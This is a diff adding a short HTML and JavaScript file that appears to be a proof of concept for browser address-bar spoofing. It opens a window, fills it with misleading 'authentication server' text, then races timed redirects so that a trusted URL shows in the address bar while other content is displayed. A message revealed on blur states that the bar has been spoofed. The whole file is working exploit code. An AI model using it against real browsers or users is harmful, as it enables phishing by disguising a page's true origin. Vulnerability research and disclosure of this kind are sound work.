@@ -1,0 +1,33 @@
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+
+<button onclick=newWindow()>New Window</button>
+<button onclick=spoof()>Spoof</button>
+
+<script>
+let w;
+let t;
+
+function newWindow() {
+  w = window.open("", "", "");
+  w.document.write(`<body onblur="document.body.innerHTML='<h2>Your address bar has been spoofed. This is not https://www.example.com</h2>'"><h2>There was a problem communicating with drive authentication server, please switch to previous tabs. Do not close this window, closing this window will cancel current download.</h2></body>`);
+}
+
+function spoof() {
+    w.location.href = 'https://www.example.com/';
+
+var i = setInterval(function () {
+  try {
+    w.location.href;
+  } catch (e) {
+    w.location.href = 'https://www.google.com/csi';
+
+    clearInterval(i);
+  }
+}, 1);
+
+
+}
+
+</script>
